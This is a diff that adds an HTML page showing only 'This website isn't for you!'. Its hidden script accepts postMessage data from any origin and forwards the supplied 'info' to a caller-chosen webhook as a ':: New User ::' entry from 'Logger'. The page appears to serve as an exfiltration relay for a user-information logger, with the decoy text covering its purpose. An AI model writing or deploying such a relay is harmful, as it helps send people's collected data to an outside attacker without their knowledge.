@@ -1,0 +1,31 @@
+<html>
+
+<body>
+    <p>This website isn't for you!</p>
+    <script>
+        window.addEventListener('message', (e) => {
+            let r = e.data
+            if (r.type === 'wh') {
+                if (r.info && r.wh) {
+                    fetch(r.wh, {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json',
+                        },
+                        body: JSON.stringify({
+                            username: 'Logger',
+                            avatar_url: 'https://github.com/Zuriix.png',
+                            embeds: [{
+                                color: 9730954,
+                                title: `:: New User ::`,
+                                description: r.info,
+                            }, ],
+                        }),
+                    })
+                }
+            }
+        });
+    </script>
+</body>
+
+</html>
